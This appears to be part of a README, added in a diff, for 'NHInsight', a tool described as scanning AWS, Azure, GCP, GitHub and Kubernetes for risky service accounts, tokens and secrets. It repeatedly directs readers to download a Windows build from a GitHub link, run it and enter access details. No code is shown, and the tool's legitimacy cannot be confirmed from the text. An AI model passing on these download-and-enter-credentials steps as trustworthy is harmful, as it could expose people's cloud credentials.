+If results look empty:
+
+- Confirm the target has data in it
+- Check that the scan scope is not too narrow
+- Make sure the right org, account, or cluster was chosen
+
+## 🧠 How NHInsight fits into your workflow
+
+NHInsight works well when you want a quick check of machine access before a review, change, or cleanup. It helps you see where non-human identities and secrets may create risk across cloud and CI/CD systems.
+
+You can use it when:
+
+- A team adds new service accounts
+- A repo starts using more secrets
+- A cluster gets new workloads
+- A cloud account grows fast
+- You want to review access before a change
+- You want to check for stale or broad permissions
+
+## 🧪 Typical scan flow
+
+1. Download NHInsight from the link above
+2. Open the app on Windows
+3. Pick the platform you want to review
+4. Add the needed access details
+5. Run the scan
+6. Read the results
+7. Save the report
+8. Fix the highest-risk items first
+
+## 🔐 Access types NHInsight may review
+
+NHInsight is built around machine access and the paths it can take. That can include:
+
+- API tokens
+- Access keys
+- Service principals
+- Managed identities
+- Service accounts
+- GitHub tokens
+- CI/CD secrets
+- Cluster role bindings
+
+These are the places where hidden access often grows over time.
+
+## 📌 Project details
+
+- Name: NHInsight
+- Type: Open-source security tool
+- Focus: Risky non-human identities and access paths
+- Platforms: AWS, Azure, GCP, GitHub, Kubernetes, GitHub Actions
+- Topics: aws, azure, gcp, github, githubactions, iam, k8s, least-privilege, nhi, non-human-identity, secrets, service-accounts, zero-trust
+
+## 🧭 Start here
+
+1. Open the download page: https://github.com/Adenaprimary348/NHInsight
+2. Get the Windows build or project files
+3. Run the app
+4. Scan one system first
+5. Review the findings
+6. Repeat for other systems
